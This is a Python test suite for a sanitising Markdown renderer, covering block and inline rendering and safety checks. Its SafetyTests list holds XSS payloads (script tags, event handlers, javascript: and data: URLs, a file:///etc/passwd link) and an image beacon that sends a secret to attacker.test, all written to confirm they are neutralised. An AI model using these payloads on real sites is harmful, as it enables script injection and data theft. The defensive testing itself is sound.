"""The Markdown renderer: CommonMark core, GitHub extensions, and the safety guarantees."""

from __future__ import annotations

import random
import re
from html.parser import HTMLParser

from django.test import SimpleTestCase

from backend.apps.core.assistant.services.safe_markdown import MAX_CHARS, render

ALLOWED_TAGS = {
    'div', 'p', 'br', 'hr', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'a',
    'ul', 'ol', 'li', 'blockquote', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'input',
}  # fmt: skip
ALLOWED_ATTRS = {
    'class', 'href', 'title', 'rel', 'target', 'start', 'data-lang', 'type', 'disabled', 'checked',
}  # fmt: skip


class _Auditor(HTMLParser):
    """Fails on any tag, attribute or link target the renderer is not meant to write."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.problems: list[str] = []
        self.text: list[str] = []

    def handle_starttag(self, tag: str, attrs: list) -> None:
        if tag not in ALLOWED_TAGS:
            self.problems.append(f'tag <{tag}>')
        for name, value in attrs:
            if name not in ALLOWED_ATTRS:
                self.problems.append(f'attribute {name}')
            if name == 'href' and not re.match(r'^(https?://|mailto:|/(?!/)|#)', value or ''):
                self.problems.append(f'href {value!r}')
            if name == 'type' and value != 'checkbox':
                self.problems.append(f'input type {value!r}')
        if tag == 'a' and not any(n == 'href' for n, _ in attrs):
            self.problems.append('anchor without href')

    def handle_data(self, data: str) -> None:
        self.text.append(data)


def audit(markup: str) -> list[str]:
    auditor = _Auditor()
    auditor.feed(markup)
    return auditor.problems


def body(text: str) -> str:
    out = render(text)
    assert out.startswith('<div class="ifinmail-md">') and out.endswith('</div>')
    return out[len('<div class="ifinmail-md">') : -len('</div>')]


class BlockTests(SimpleTestCase):
    def test_paragraphs_and_breaks(self) -> None:
        self.assertEqual(body('one\ntwo'), '<p>one\ntwo</p>')
        self.assertEqual(body('one\n\ntwo'), '<p>one</p><p>two</p>')
        self.assertEqual(body('one  \ntwo'), '<p>one<br>\ntwo</p>')
        self.assertEqual(body('one\\\ntwo'), '<p>one<br>\ntwo</p>')
        self.assertEqual(body(''), '')
        self.assertEqual(body('   \n\n  '), '')

    def test_headings_are_shifted_below_the_page_title(self) -> None:
        self.assertEqual(body('# A'), '<h3 class="ifinmail-md-h">A</h3>')
        self.assertEqual(body('###### F'), '<h6 class="ifinmail-md-h">F</h6>')
        self.assertEqual(body('####### seven'), '<p>####### seven</p>')
        self.assertEqual(body('## closed ##'), '<h4 class="ifinmail-md-h">closed</h4>')
        self.assertEqual(body('Title\n====='), '<h3 class="ifinmail-md-h">Title</h3>')
        self.assertEqual(body('Sub\n---'), '<h4 class="ifinmail-md-h">Sub</h4>')
        self.assertEqual(body('#nospace'), '<p>#nospace</p>')

    def test_thematic_breaks(self) -> None:
        for marker in ('***', '---', '___', '* * *', '- - -'):
            self.assertEqual(body(f'a\n\n{marker}\n\nb'), '<p>a</p><hr><p>b</p>', marker)

    def test_code_blocks(self) -> None:
        self.assertEqual(
            body('```python\nprint("<hi>")\n```'),
            '<pre class="ifinmail-md-code" data-lang="python"><code class="language-python">'
            'print(&quot;&lt;hi&gt;&quot;)\n</code></pre>',
        )
        self.assertIn('~~~', body('````\n~~~\ninside\n~~~\n````'))
        self.assertEqual(
            body('    indented\n      more'),
            '<pre class="ifinmail-md-code"><code>indented\n  more\n</code></pre>',
        )
        # An unterminated fence runs to the end; markup inside is never interpreted.
        self.assertEqual(
            body('```\n**not bold**'),
            '<pre class="ifinmail-md-code"><code>**not bold**\n</code></pre>',
        )
        # The language is whitelisted: it ends up in an attribute.
        self.assertNotIn('onload', body('```x" onload="alert(1)\ncode\n```'))

    def test_block_quotes(self) -> None:
        self.assertEqual(body('> a\n> b'), '<blockquote><p>a\nb</p></blockquote>')
        self.assertEqual(body('> a\nlazy'), '<blockquote><p>a\nlazy</p></blockquote>')
        self.assertEqual(
            body('> a\n>\n> > nested'),
            '<blockquote><p>a</p><blockquote><p>nested</p></blockquote></blockquote>',
        )
        self.assertEqual(
            body('> # h\n> - x'),
            '<blockquote><h3 class="ifinmail-md-h">h</h3><ul><li>x</li></ul></blockquote>',
        )

    def test_lists(self) -> None:
        self.assertEqual(body('- a\n- b'), '<ul><li>a</li><li>b</li></ul>')
        self.assertEqual(body('* a\n* b'), '<ul><li>a</li><li>b</li></ul>')
        self.assertEqual(body('1. a\n2. b'), '<ol><li>a</li><li>b</li></ol>')
        self.assertEqual(body('3. a\n4. b'), '<ol start="3"><li>a</li><li>b</li></ol>')
        self.assertEqual(body('1) a\n2) b'), '<ol><li>a</li><li>b</li></ol>')
        # A different bullet starts a new list.
        self.assertEqual(body('- a\n+ b'), '<ul><li>a</li></ul><ul><li>b</li></ul>')
        # Nesting by indentation, and a list directly after a paragraph line.
        self.assertEqual(
            body('- a\n  - b\n    - c\n- d'),
            '<ul><li>a<ul><li>b<ul><li>c</li></ul></li></ul></li><li>d</li></ul>',
        )
        self.assertEqual(body('Steps:\n- a\n- b'), '<p>Steps:</p><ul><li>a</li><li>b</li></ul>')
        self.assertEqual(
            body('1. a\n   - x\n2. b'), '<ol><li>a<ul><li>x</li></ul></li><li>b</li></ol>'
        )

    def test_tight_and_loose_lists(self) -> None:
        self.assertEqual(body('- a\n\n- b'), '<ul><li><p>a</p></li><li><p>b</p></li></ul>')
        self.assertEqual(
            body('- a\n\n  more\n- b'), '<ul><li><p>a</p><p>more</p></li><li><p>b</p></li></ul>'
        )
        self.assertEqual(body('- a\n  continued\n- b'), '<ul><li>a\ncontinued</li><li>b</li></ul>')
        self.assertEqual(body('- a\nlazy\n- b'), '<ul><li>a\nlazy</li><li>b</li></ul>')

    def test_code_inside_list_items(self) -> None:
        out = body('1. Run:\n\n   ```bash\n   make update\n   ```\n2. Done')
        self.assertIn(
            '<pre class="ifinmail-md-code" data-lang="bash">'
            '<code class="language-bash">make update\n</code></pre>',
            out,
        )
        self.assertEqual(out.count('<li>'), 2)

    def test_task_lists(self) -> None:
        self.assertEqual(
            body('- [ ] a\n- [x] b\n- [X] c'),
            '<ul><li class="ifinmail-md-task"><input type="checkbox" disabled> a</li>'
            '<li class="ifinmail-md-task"><input type="checkbox" disabled checked> b</li>'
            '<li class="ifinmail-md-task"><input type="checkbox" disabled checked> c</li></ul>',
        )
        self.assertEqual(body('- [link]'), '<ul><li>[link]</li></ul>')

    def test_tables(self) -> None:
        out = body('| Name | Qty |\n|:-----|----:|\n| a | 1 |\n| b | 2 |')
        self.assertIn('<th class="ifinmail-md-left">Name</th>', out)
        self.assertIn('<th class="ifinmail-md-right">Qty</th>', out)
        self.assertEqual(out.count('<tr>'), 3)
        self.assertTrue(out.startswith('<div class="ifinmail-md-table"><table>'))
        # No outer pipes, centre alignment, ragged rows, escaped and code pipes, inline markup.
        out = body('a | b\n:-: | -\n**x** | y | extra\nz\n\\| | `p|q`')
        self.assertIn('<th class="ifinmail-md-center">a</th>', out)
        self.assertIn('<td class="ifinmail-md-center"><strong>x</strong></td><td>y</td>', out)
        self.assertNotIn('extra', out)
        self.assertIn('<td class="ifinmail-md-center">z</td><td></td>', out)
        self.assertIn('<td class="ifinmail-md-center">|</td><td><code>p|q</code></td>', out)
        # A table directly after a sentence, and a delimiter row that does not match.
        self.assertIn(
            '<p>Here:</p><div class="ifinmail-md-table">', body('Here:\n| a |\n|---|\n| 1 |')
        )
        self.assertNotIn('<table>', body('| a | b |\n|---|\n| 1 | 2 |'))

    def test_reference_definitions(self) -> None:
        out = body(
            '[docs]: https://example.com/docs "Docs"\n\nRead [the docs][docs], [docs] or [Docs][].'
        )
        self.assertEqual(out.count('href="https://example.com/docs"'), 3)
        self.assertNotIn('[docs]:', out)
        self.assertEqual(body('[missing] and [x][nope]'), '<p>[missing] and [x][nope]</p>')
        # A definition inside a code fence is code, not a definition.
        self.assertNotIn('<a', body('```\n[a]: https://x.test\n```\n\n[a]'))


class InlineTests(SimpleTestCase):
    def test_emphasis(self) -> None:
        cases = {
            '*a*': '<p><em>a</em></p>',
            '_a_': '<p><em>a</em></p>',
            '**a**': '<p><strong>a</strong></p>',
            '__a__': '<p><strong>a</strong></p>',
            '***a***': '<p><em><strong>a</strong></em></p>',
            '**a *b* c**': '<p><strong>a <em>b</em> c</strong></p>',
            '*a **b** c*': '<p><em>a <strong>b</strong> c</em></p>',
            '~~a~~': '<p><del>a</del></p>',
            '~a~': '<p>~a~</p>',
            'snake_case_name': '<p>snake_case_name</p>',
            '2 * 3 * 4': '<p>2 * 3 * 4</p>',
            '*not closed': '<p>*not closed</p>',
            '** a **': '<p>** a **</p>',
            '**foo*': '<p>*<em>foo</em></p>',
            'a*b*c': '<p>a<em>b</em>c</p>',
            '\\*literal\\*': '<p>*literal*</p>',
            '*(a)*': '<p><em>(a)</em></p>',
        }
        for source, expected in cases.items():
            with self.subTest(source=source):
                self.assertEqual(body(source), expected)

    def test_code_spans(self) -> None:
        cases = {
            '`a`': '<p><code>a</code></p>',
            '`` a`b ``': '<p><code>a`b</code></p>',
            '`<b>&`': '<p><code>&lt;b&gt;&amp;</code></p>',
            '`*not em*`': '<p><code>*not em*</code></p>',
            '`unclosed': '<p>`unclosed</p>',
            '`a\nb`': '<p><code>a b</code></p>',
        }
        for source, expected in cases.items():
            with self.subTest(source=source):
                self.assertEqual(body(source), expected)

    def test_links(self) -> None:
        link = 'rel="noopener noreferrer nofollow" target="_blank"'
        self.assertEqual(
            body('[a](https://x.test/p?q=1&r=2)'),
            f'<p><a href="https://x.test/p?q=1&amp;r=2" {link}>a</a></p>',
        )
        self.assertIn('title="T"', body('[a](https://x.test "T")'))
        self.assertIn('<em>b</em>', body('[a *b*](https://x.test)'))
        self.assertIn('href="https://x.test/a(b)"', body('[a](https://x.test/a(b))'))
        # Same-site paths and anchors link in the same tab; no new window.
        self.assertEqual(
            body('[s](/accounts/settings/)'), '<p><a href="/accounts/settings/">s</a></p>'
        )
        self.assertEqual(body('[s](#top)'), '<p><a href="#top">s</a></p>')
        self.assertNotIn('<a', body('[s](//evil.test/x)'))

    def test_autolinks(self) -> None:
        link = 'rel="noopener noreferrer nofollow" target="_blank"'
        self.assertEqual(
            body('see https://x.test/a_b, then'),
            f'<p>see <a href="https://x.test/a_b" {link}>https://x.test/a_b</a>, then</p>',
        )
        self.assertIn('href="https://www.x.test"', body('visit www.x.test.'))
        self.assertIn('href="https://x.test/a_(b)"', body('(https://x.test/a_(b))'))
        self.assertIn('href="mailto:me@x.test"', body('<me@x.test>'))
        self.assertIn('href="https://x.test"', body('<https://x.test>'))
        self.assertNotIn('<a', body('`https://x.test`'))
        self.assertEqual(body('ftp://x.test'), '<p>ftp://x.test</p>')

    def test_characters(self) -> None:
        self.assertEqual(body('a &amp; b &lt; c &#35; &copy;'), '<p>a &amp; b &lt; c # ©</p>')
        self.assertEqual(
            body('AT&T &notanentity; 1 < 2'), '<p>AT&amp;T &amp;notanentity; 1 &lt; 2</p>'
        )
        self.assertEqual(body('\\# \\> \\[x\\]'), '<p># &gt; [x]</p>')
        self.assertEqual(body('café – naïve 日本語'), '<p>café – naïve 日本語</p>')


class SafetyTests(SimpleTestCase):
    ATTACKS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '[x](javascript:alert(1))',
        '[x](JaVaScRiPt:alert(1))',
        '[x](&#106;avascript:alert(1))',
        '[x](java\tscript:alert(1))',
        '[x](  javascript:alert(1))',
        '[x](data:text/html;base64,PHNjcmlwdD4=)',
        '[x](vbscript:msgbox(1))',
        '[x](file:///etc/passwd)',
        '<javascript:alert(1)>',
        '<a href="javascript:alert(1)">x</a>',
        '![x](javascript:alert(1))',
        '![tracking pixel](https://attacker.test/p.png?d=SECRET)',
        '[ref]: javascript:alert(1)\n\n[ref]',
        '"><svg onload=alert(1)>',
        '```"><script>alert(1)</script>\n```',
        '| <script> |\n|---|\n| <b onclick=x> |',
        '<iframe src="https://evil.test"></iframe>',
        '<style>body{display:none}</style>',
        '[a](https://x.test" onmouseover="alert(1))',
        '[a](https://x.test "t\\" onclick=\\"alert(1)")',
        '\x00<script>',
        '<![CDATA[ <script>alert(1)</script> ]]>',
        '<!-- --><script>alert(1)</script>',
    ]

    def test_attacks_produce_only_whitelisted_markup(self) -> None:
        for attack in self.ATTACKS:
            with self.subTest(attack=attack):
                out = render(attack)
                self.assertEqual(audit(out), [], out)
                self.assertNotIn('<script', out.lower())

    def test_hostile_titles_stay_inside_their_attribute(self) -> None:
        out = render('[a](https://x.test "t\\" onclick=\\"alert(1)")')
        self.assertEqual(audit(out), [])
        self.assertIn('title="t&quot; onclick=&quot;alert(1)"', out)

    def test_images_never_become_image_elements(self) -> None:
        out = render(
            '![pixel](https://attacker.test/p.png?d=SECRET) ![x][r]\n\n[r]: https://a.test/i.png'
        )
        self.assertNotIn('<img', out)
        self.assertEqual(audit(out), [])

    def test_raw_html_is_shown_as_text(self) -> None:
        self.assertEqual(body('<b>x</b>'), '<p>&lt;b&gt;x&lt;/b&gt;</p>')

    def test_unsafe_links_keep_their_text_but_lose_the_link(self) -> None:
        self.assertEqual(body('[click me](javascript:alert(1))'), '<p>click me</p>')

    def test_random_input_never_breaks_the_whitelist(self) -> None:
        rng = random.Random(20261012)
        pieces = [
            '*', '**', '_', '__', '~~', '`', '```', '[', ']', '(', ')', '<', '>', '!', '#', '- ',
            '1. ', '> ', '| ', '|---|', ':', '\\', '&', '&amp;', 'http://x.test', 'javascript:',
            '\n', '\n\n', '  \n', '    ', '\t', 'word', ' ', 'é', '"', "'", '=', '</script>',
        ]  # fmt: skip
        for _ in range(400):
            source = ''.join(rng.choice(pieces) for _ in range(rng.randint(1, 60)))
            out = render(source)
            self.assertEqual(audit(out), [], repr(source))

    def test_limits(self) -> None:
        deep = '> ' * 40 + 'bottom'
        self.assertEqual(audit(render(deep)), [])
        self.assertLess(render(deep).count('<blockquote>'), 12)
        nested = ''.join('  ' * level + '- item\n' for level in range(30))
        self.assertEqual(audit(render(nested)), [])
        big = render('x' * (MAX_CHARS * 3))
        self.assertLess(len(big), MAX_CHARS + 200)
        # Pathological emphasis and bracket input finishes quickly (no catastrophic backtracking).
        for source in ('*a ' * 5000, '[' * 3000, '`a' * 4000, '_a' * 5000, '[a](' * 2000):
            self.assertEqual(audit(render(source)), [])
